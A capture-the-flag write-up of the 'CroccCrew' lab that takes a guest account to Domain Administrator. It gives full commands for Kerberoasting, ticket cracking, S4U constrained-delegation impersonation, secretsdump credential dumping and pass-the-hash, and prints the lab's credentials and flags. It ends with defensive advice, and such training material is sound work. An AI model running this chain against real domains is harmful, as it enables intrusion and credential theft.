---
layout: default
title: CroccCrew – Active Directory
page_type: writeup
---

# HTB: CroccCrew – Kerberoasting & Constrained Delegation Abuse

**Category:** Active Directory

---

## Challenge Overview

This challenge presents a Windows Active Directory environment vulnerable to **Kerberoasting** and **constrained delegation abuse**.  
The objective is to pivot from low-privileged access to full **Domain Administrator** compromise.

### Environment
- **Domain:** `COOCTUS.CORP`
- **Domain Controller:** `DC.COOCTUS.CORP` (Windows Server 2019)
- **Initial Access:** Guest credentials
- **Target:** Domain Administrator / root flag

### Core Attack Chain
1. Enumerate the domain using low-privileged credentials
2. Identify Kerberoastable service accounts
3. Crack service account credentials offline
4. Abuse constrained delegation with protocol transition (S4U)
5. Impersonate Administrator
6. Dump domain credentials and obtain full control

This attack abuses **TRUSTED_TO_AUTH_FOR_DELEGATION**, allowing a compromised service account to impersonate arbitrary users to delegated services.

---

## Reconnaissance

### Network Enumeration

A full scan was performed to identify exposed services:

```bash
rustscan -a 10.64.158.191 --ulimit 5500 -b 65535 -- -A -Pn
````

The target exposed standard Active Directory services:

* Kerberos (88)
* LDAP (389 / 3268)
* SMB (445)
* RDP (3389)
* HTTP (80)

---

### Web Enumeration

The web server exposed sensitive files via `robots.txt`:

```bash
curl http://10.64.158.191/robots.txt
```

```
/db-config.bak
/backdoor.php
```

The database configuration backup contained hardcoded credentials:

```php
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";
```

While not required for the AD attack, this demonstrated poor security hygiene and reinforced the likelihood of further misconfigurations.

---

## Initial Access

### Guest Authentication

Guest SMB credentials were validated successfully:

```bash
crackmapexec smb DC.COOCTUS.CORP -u Visitor -p GuestLogin!
```

With access confirmed, SMB shares were enumerated:

```bash
smbclient -L //10.64.158.191 -U Visitor
```

The `Home` share contained the initial user flag:

```bash
smbclient //10.64.158.191/Home -U Visitor
get user.txt
```

**User flag:** `THM{Gu3st_Pl3as3}`

---

## Active Directory Enumeration

Domain objects were dumped via LDAP:

```bash
ldapdomaindump -u '10.64.158.191\Visitor' -p 'GuestLogin!' DC.COOCTUS.CORP
```

### High-Value Findings

Among standard domain users, a service account stood out:

| Account          | SPN                    | Flags                          |
| ---------------- | ---------------------- | ------------------------------ |
| `password-reset` | `HTTP/dc.cooctus.corp` | TRUSTED_TO_AUTH_FOR_DELEGATION |

This account:

* Is **Kerberoastable** (has an SPN)
* Has **constrained delegation with protocol transition**
* Does **not** require the target user’s password to impersonate them

This represents a direct path to domain compromise if the password is weak.

---

## Kerberoasting

A service ticket was requested for the vulnerable account:

```bash
GetUserSPNs.py COOCTUS.CORP/Visitor:GuestLogin! \
  -dc-ip 10.64.158.191 \
  -request \
  -outputfile out.txt
```

The extracted ticket was RC4-HMAC (etype 23), making it fast to crack.

---

## Offline Password Cracking

The Kerberos ticket was cracked using John:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt out.txt
```

```
password-reset : resetpassword
```

Credentials were validated successfully against the domain.

---

## Constrained Delegation Abuse

Delegation settings were enumerated:

```bash
findDelegation.py COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.64.158.191
```

The account was allowed to delegate to the Domain Controller service:

```
oakley/DC.COOCTUS.CORP
```

This enables:

* **S4U2Self** - impersonate any user
* **S4U2Proxy** - access delegated services as that user

---

## Exploitation (S4U2Self + S4U2Proxy)

A service ticket was forged to impersonate `Administrator`:

```bash
getST.py -spn oakley/DC.COOCTUS.CORP \
  -impersonate Administrator \
  "COOCTUS.CORP/password-reset:resetpassword" \
  -dc-ip 10.64.158.191
```

The generated Kerberos ticket was loaded and verified:

```bash
export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP.ccache
klist
```

---

## Domain Credential Dumping

Using the forged ticket, domain credentials were dumped:

```bash
secretsdump.py -k -no-pass DC.COOCTUS.CORP
```

The Administrator NTLM hash was successfully extracted.

---

## Domain Compromise

Administrator access was obtained via pass-the-hash:

```bash
evil-winrm -i 10.64.158.191 -u Administrator -H <hash>
```

All remaining flags were retrieved, including the root flag:

```
THM{Cr0ccCrewStr1kes!}
```

---

## Attack Summary

### Attack Chain

1. Guest SMB access
2. LDAP enumeration
3. Kerberoasting service account
4. Offline password cracking
5. Constrained delegation abuse
6. Credential dumping
7. Domain Administrator compromise

### Critical Failures

* Weak service account password
* Excessive delegation privileges
* No monitoring for Kerberos abuse
* No protection on high-value accounts

---

## Defensive Recommendations

* Use **gMSAs** for all service accounts
* Disable RC4 Kerberos encryption
* Apply **Protected Users** to admins
* Replace constrained delegation with **RBCD**
* Monitor for Kerberoasting and S4U activity
* Enforce tiered administration model

---

## Final Notes

This challenge highlights how **service accounts with delegation** represent one of the most dangerous attack paths in Active Directory. A single cracked service account password can escalate directly to Domain Administrator when delegation is misconfigured.
